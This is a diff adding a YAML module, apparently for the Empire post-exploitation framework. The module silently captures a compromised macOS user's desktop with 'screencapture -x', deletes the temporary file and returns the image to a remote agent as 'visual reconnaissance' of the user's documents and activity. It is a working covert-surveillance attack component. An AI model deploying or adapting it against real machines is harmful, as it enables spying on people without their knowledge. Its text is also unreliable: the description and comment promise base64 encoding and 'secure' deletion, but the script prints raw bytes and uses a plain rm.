@@ -1,0 +1,42 @@
+name: Screenshot
+authors:
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: |
+  Captures a screenshot of the macOS desktop using the native screencapture utility
+  and returns the image data in PNG format. This module provides visual reconnaissance
+  capabilities by capturing the current state of the user's desktop, including
+  open applications, documents, and user activity. The screenshot is temporarily
+  saved to disk, converted to base64 format for transmission, and then securely
+  deleted.
+software: ''
+tactics: []
+techniques:
+  - T1113
+background: false
+output_extension: png
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments: []
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: SavePath
+    description: Path of the temporary screenshot file to save.
+    required: true
+    value: /tmp/out.png
+script: |
+  # take a screenshot using screencapture
+  run_command('screencapture -x {{ SavePath }}')
+  # base64 up resulting file, delete the file, return the base64 of the png output
+  #   mocked from the Empire screenshot module
+  f = open('{{ SavePath }}', 'rb')
+  data = f.read()
+  f.close()
+  run_command('rm -f {{ SavePath }}')
+  print(data)
